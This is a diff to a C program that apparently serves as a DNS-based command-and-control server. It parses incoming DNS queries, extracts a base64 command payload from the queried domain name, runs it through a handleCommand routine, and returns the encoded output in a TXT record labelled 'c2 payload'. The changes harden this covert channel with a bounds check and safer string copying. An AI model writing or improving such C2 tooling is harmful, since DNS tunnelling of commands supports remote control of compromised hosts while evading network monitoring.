@@ -39,19 +39,19 @@ int main()
     while (TRUE)
     {
         // Wait until data packet, write from sockfd file to buffer
-        int n = recvfrom(sockfd, (char *)buffer, MAX_BUFFER_SIZE, MSG_WAITALL, (struct sockaddr *)&client_addr, &addr_len);
-        if (n < 0)
+        int bytes_read = recvfrom(sockfd, (char *)buffer, MAX_BUFFER_SIZE, 0, (struct sockaddr *)&client_addr, &addr_len);
+        if (bytes_read < 0)
         {
             perror("Recv failed");
             continue;
         }
-        buffer[n] = '\0';
+        buffer[bytes_read] = '\0';
 
         // Packet Recived
         printf("\nRecived packet from %s:%d\n", inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
 
         struct dns_packet packet;
-        parse_dns_packet(buffer, &packet);
+        parse_dns_packet(buffer, &packet, bytes_read);
 
         printf("ID: 0x%X | Domain: %s | Type: %d\n",
                ntohs(packet.header.id),
@@ -59,13 +59,13 @@ int main()
                packet.question.qtype);
 
         // After reciving packet and parsing it, return valid response back to client
-        send_response(sockfd, buffer, n, &packet, &client_addr, addr_len);
+        send_response(sockfd, buffer, bytes_read, &packet, &client_addr, addr_len);
     }
 
     return 0;
 }
 
-void parse_dns_packet(char *buffer, struct dns_packet *packet)
+void parse_dns_packet(char *buffer, struct dns_packet *packet, int bytes_read)
 {
     struct dns_header *raw_header = (struct dns_header *)buffer;
     packet->header = *raw_header; // Copy header
@@ -76,6 +76,9 @@ void parse_dns_packet(char *buffer, struct dns_packet *packet)
     int i = 0;
     while (*reader != 0 && i < 255)
     {
+        if (reader >= buffer + bytes_read)
+            break; // Prevent overflow
+
         int length = *reader;
         reader++;
 
@@ -127,17 +130,17 @@ void send_response(int sockfd, char *request_buffer, int request_len, struct dns
     // --- TXT Record for c2 payload ---
     struct dns_answer *answer = (struct dns_answer *)(reply_buffer + DNS_HEADER_SIZE + q_len);
 
-    // Payload Data
-    char txt_data[256];
-    char response[1024];
-    char encoded_response[2048];
-
+    char txt_data[256]; // extracted payload
     extractPayload(parsed_packet->question.name, txt_data);
+
+    char response[1024]; // Buffer to hold command response
+
     char *decoded_payload = base64_decode(txt_data);
     handleCommand(decoded_payload, response);
 
+    char encoded_response[2048]; // Buffer to hold base64 encoded response
     char *encoded = base64_encode(response);
-    strcpy(encoded_response, encoded);
+    snprintf(encoded_response, sizeof(encoded_response), "%s", encoded);
     free(encoded);
 
     int txt_len = strlen(encoded_response);
